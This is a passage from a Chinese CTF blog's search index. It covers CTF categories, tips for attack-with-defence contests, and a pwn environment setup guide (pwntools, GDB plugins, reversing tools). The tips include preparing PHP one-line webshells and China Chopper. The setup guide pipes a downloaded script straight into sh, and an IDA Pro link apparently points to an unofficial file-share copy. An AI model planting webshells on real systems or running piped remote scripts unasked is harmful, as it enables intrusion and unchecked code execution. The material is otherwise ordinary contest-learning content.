题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。</p><p>  所需知识：矩阵、数论、密码学</p></li><li><p>Misc</p><p>  Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。</p><p>  所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p></li><li><p>Mobile</p><p>  主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。</p><p>  所需知识：Java，Android 开发，常见工具</p></li></ul><h2 id="线下赛-AWD-模式"><a href="#线下赛-AWD-模式" class="headerlink" title="线下赛 AWD 模式"></a>线下赛 AWD 模式</h2><p>Attack With Defence，简而言之就是你既是一个 hacker，又是一个 manager。</p><p>比赛形式：一般就是一个 ssh 对应一个服务，可能是 web 也可能是 pwn，然后 flag 五分钟一轮，各队一般都有自己的初始分数，flag 被拿会被拿走 flag 的队伍均分，主办方会对每个队伍的服务进行 check，check 不过就扣分，扣除的分值由服务 check 正常的队伍均分。</p><h3 id="怎样拿到-flag"><a href="#怎样拿到-flag" class="headerlink" title="怎样拿到 flag"></a>怎样拿到 flag</h3><p>1.web 主要是向目标服务器发送 http 请求，返回 flag</p><p>2.bin 主要是通过 exploit 脚本读取 /home/username 下某个文件夹下的 flag 文件</p><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul><li>如果自己拿到 FB， 先用 NPC 服务器或者自己服务器测试，格外小心自己的 payload 不要被别的队伍抓取到, 写打全场的 exp 时，一定要加入混淆流量。</li><li>提前准备好 PHP 一句话木马等等脚本。</li><li>小心其他队伍恶意攻击使我们队伍机器的服务不能正常运行，因此一定要备份服务器的配置。</li><li>尽可能在不搞崩服务和绕过 check 的情况下，上 WAF，注意分析别人打过来的流量，如果没有混淆，可以大大加快我们的漏洞分析速度。</li><li>工具准备: 中国菜刀、 Nmap、Xshell、 合适的扫描器等。</li><li>心态不要崩。</li><li>不要忽视 Github 等平台，可能会有写好的 exp 可以用。</li><li>将 flag 的提交自动化。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://baike.baidu.com/item/ctf/9548546#viewPageContent">CTF（夺旗赛）</a></p><h4 id="注：以上内容摘抄于-CTF-All-In-One"><a href="#注：以上内容摘抄于-CTF-All-In-One" class="headerlink" title="注：以上内容摘抄于 CTF-All-In-One"></a>注：以上内容摘抄于 <a href="https://github.com/firmianay/CTF-All-In-One">CTF-All-In-One</a></h4>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome BurYiA的小世界</title>
      <link href="2020/02/26/welcome-to-my-blog/"/>
      <url>2020/02/26/welcome-to-my-blog/</url>
      
        <content type="html"><![CDATA[<p>欢迎来到 <strong>BurYiA的博客</strong>。</p><h2 id="这里有什么？"><a href="#这里有什么？" class="headerlink" title="这里有什么？"></a>这里有什么？</h2><ul><li>平时练习ctf时写下的writeup(以二进制为主)</li><li>平时练习编程算法时写下的</del>答案</del>总结</li><li>有关于各种电脑知识应用的文章</li><li>一些有趣的网络安全技术</li><li>一段充实奋斗的时光</li></ul><blockquote><p>每个人的青春都是一场有去无回的旅行，因而青春显得无比珍贵和充满神秘。在青春里，你可能会迷茫，也会执着，青春也会让你张扬地笑，也会给你莫名的痛。但不管怎么样，青春多好啊，请不要在美好的岁月中放弃自己。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn手环境搭建</title>
      <link href="2020/02/25/CTF/pwn-environment-setup/"/>
      <url>2020/02/25/CTF/pwn-environment-setup/</url>
      
        <content type="html"><![CDATA[<p>作为一个pwn手，一个自己的环境是少不了的，这个博客记录一下环境的搭建过程给需要的同学</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>pwn的环境可以用 vmware 创建一个虚拟机去承载，也可以用 WSL2 去承载，WSL相对方便一些但是有时候可能会出一些问题，vmware 虚拟机全面一些但是相比 wsl 总显得有些笨重（<del>我也不知道为啥会这么觉得</del>）</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">WSL2</button></li><li class="tab"><button type="button" data-href="#test1-2">VMware虚拟机</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><h3 id="WSL安装并升级到WSL2"><a href="#WSL安装并升级到WSL2" class="headerlink" title="WSL安装并升级到WSL2"></a>WSL安装并升级到WSL2</h3><p>详情请参照此处 <a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10">https://docs.microsoft.com/zh-cn/windows/wsl/install-win10</a><br>PS: 先开启wsl功能即可，先不安装具体的linux分发</p><h3 id="WSL管理工具LxRunOffline下载以及手动安装WSL"><a href="#WSL管理工具LxRunOffline下载以及手动安装WSL" class="headerlink" title="WSL管理工具LxRunOffline下载以及手动安装WSL"></a>WSL管理工具LxRunOffline下载以及手动安装WSL</h3><p>首先从这儿下载我们需要的LxRunOffline工具 <a href="https://github.com/DDoSolitary/LxRunOffline/releases">https://github.com/DDoSolitary/LxRunOffline/releases</a><br>有了这个工具我们就可以在任何我们想的地方安装WSL并且可以很方便的去管理他们</p><p>其次，我们需要手动下载需要安装的Linux分发的包 <a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-manual">https://docs.microsoft.com/zh-cn/windows/wsl/install-manual</a></p><p>下载下来以后就可以参照这篇文章 <a href="https://sspai.com/post/61634">https://sspai.com/post/61634</a> 进行 linux 子系统的安装啦<br>PS:文章中的方法没验证过，当时我用的那个文章找不到了，随便找了一个，有问题记得反馈</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>linux安装好后便可以使用了，可以在 cmd 或者 Windows Terminal 中输入 WSL 启动（只安装了一个 wsl linux 的情况下，其他的自行百度解决）<br>也可以在 vs code 中使用，vs code 中有对应的 wsl 插件，开启 wsl 功能后进入 vs code 会自动提示安装，安装好后便可以在 vs code 中连接 wsl linux 进行使用，体验行对可以好一些</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><h3 id="VMware-workstation-pro-发布16版本了"><a href="#VMware-workstation-pro-发布16版本了" class="headerlink" title="VMware workstation pro 发布16版本了"></a>VMware workstation pro 发布16版本了</h3><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.imessy.cn/2020-09-23/1600867457-572367-1600849393-599897-screenshot-20200921-222225.jpeg" alt="upl-image-preview url="></p><p>运行Windows DirectX11游戏和应用程序<br>使用vctl进行运行、生成、推送或拉取OCI容器<br>支持在桌面上部署K8S环境<br>新增无障碍模式</p><p>fusion  12<br>新增VM规格，32vCPU、128G内存，8GVRAM<br>支持vSphere7本地和远程连接<br>优化VM操作性和文件传输能力<br>在隔离的沙盒中运行vGPU渲染引擎<br>支持暗黑模式<br>支持Windows Hpyer-V<br>支持最新版Windows 10和Linux最新版本（发行版本）<br>集成Linux Vulkan 渲染引擎</p><h3 id="官网下载地址"><a href="#官网下载地址" class="headerlink" title="官网下载地址"></a>官网下载地址</h3><p><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html</a></p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>虚拟机推荐使用<a href="https://releases.ubuntu.com/16.04.7/?_ga=2.108058497.2055368663.1606723165-415207836.1606723165">ubuntu16.04</a>或者ubuntu14，比赛时用的基本也就是这两个版本的系统，用起来相对方便一些</p><h3 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h3><p>走默认 VMware 的默认安装，设置好账户名密码主机名后坐等完成即可</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="pwn环境搭建"><a href="#pwn环境搭建" class="headerlink" title="pwn环境搭建"></a>pwn环境搭建</h1><p>好了，到了这儿就默认大家已经有一个可以使用的 linux 系统的，接下来我们在这个系统上安装我们需要的各种东西</p><ul><li>pwntools<br>  pwntools是一个CTF框架和漏洞利用开发库，用Python开发，旨在让使用者简单快速的编写exploit。python环境推荐使用python2， 虽然这玩儿慢慢被淘汰了，但是好多 exp 是用他写的，在你复现的时候可以舒服一些  <div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test2-1">python2</button></li><li class="tab"><button type="button" data-href="#test2-2">python3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test2-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install --upgrade pip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install --upgrade pwntools</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 -m pip install --upgrade pip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 -m pip install --upgrade pwntools</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></li><li>LibcSearcher<br>  这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，这个工具就是解决这个问题的  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure></li><li>one_gadget<br>  one-gadget 是glibc里调用execve(‘/bin/sh’, NULL, NULL)的一段非常有用的gadget。这个工具可以帮我们找到它。  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby</span><br><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure></li><li>GDB 实用插件<br>  GDB 在我们的学习过程中使用的相当频繁，好多有问题的地方，动态跑一跑就能知道问题在哪儿，针对 GDB 有几款好用的插件，通过更改 ~/.gdbinit 中的信息我们可以来切换他们<br>  安装：  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">peda</span></span><br><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line"><span class="meta">#</span><span class="bash">peda-heap (搭配peda一起使用)</span></span><br><span class="line">git clone git://github.com/Mipu94/peda-heap.git ~/peda-heap</span><br><span class="line">echo &quot;source ~/peda-heap/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">gef</span></span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">pwndbg</span>    </span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">pwngdb</span></span><br><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line"></span><br><span class="line">PS:有一个就够，一般用 peda 就行</span><br></pre></td></tr></table></figure></li><li>IDA Pro<br>  交互式反汇编器专业版。是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器！<br>  推荐在 windows 下安装、使用，方便一些<br>  下载地址：<ul><li>链接: <a href="https://pan.baidu.com/s/1bdBhVTBYMk0lNIOtCxIjPw">https://pan.baidu.com/s/1bdBhVTBYMk0lNIOtCxIjPw</a> 提取码: w28g</li></ul></li><li>gfree-libc(可以没有)<br>  gfree-libc可以使你获取任意libc版本源码级（.c级别）的调试能力，你只需要gclibc指令。它希望你的gdb使用的是pwndbg插件，因为其他插件可能会出现错误。<br>  ​你只需要以下几条命令即可获取从2.19到2.29libc版本的源码级调试能力  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:dsyzy/gfree-libc.git</span><br><span class="line">cd gfree-libc</span><br><span class="line">sudo sh ./install.sh</span><br><span class="line">build   #PS:此命令执行后会下载2.19-2.29所有的glibc源码进行本地编译，时间较久，执行前做好心理准备</span><br></pre></td></tr></table></figure>  详情参考 <a href="https://freedom.dsyzy.xyz/2020/03/12/gfree-libc%E4%BD%BF%E7%94%A8%EF%BC%8C%E4%BB%BB%E6%84%8F%E5%88%87%E6%8D%A2%E5%92%8C%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E7%BA%A7libc/#%E9%A6%96%E5%85%88%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3gfree-libc%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84">这里</a></li></ul><h1 id="逆向常用工具"><a href="#逆向常用工具" class="headerlink" title="逆向常用工具"></a>逆向常用工具</h1><ul><li>吾爱破解虚拟机 2.0<br>  集合了逆向破解中经常用到的工具，并且已安装好吾爱破解论坛最新工具包！<br>  PS:有这一个基本就够了，啥都有<ul><li>虚拟机文件下载：<br>360网盘（推荐）：<a href="https://yunpan.360.cn/surl_yrj3q8K4YCU">https://yunpan.360.cn/surl_yrj3q8K4YCU</a> 密码：0c3a<br>腾讯微云：<a href="https://share.weiyun.com/d606513b540c6cf69a5ac5210af58079">https://share.weiyun.com/d606513b540c6cf69a5ac5210af58079</a> 密码：6g35hh<br>百度网盘：<a href="https://pan.baidu.com/s/1N7aSUndy7NqZ0XNZEoW6WA%E5%AF%86%E7%A0%81%EF%BC%9Anhvw">https://pan.baidu.com/s/1N7aSUndy7NqZ0XNZEoW6WA密码：nhvw</a></li><li>哈希值校验工具下载：<br>百度网盘：<a href="http://pan.baidu.com/s/1slRv0JV">http://pan.baidu.com/s/1slRv0JV</a> 密码：yzzg</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
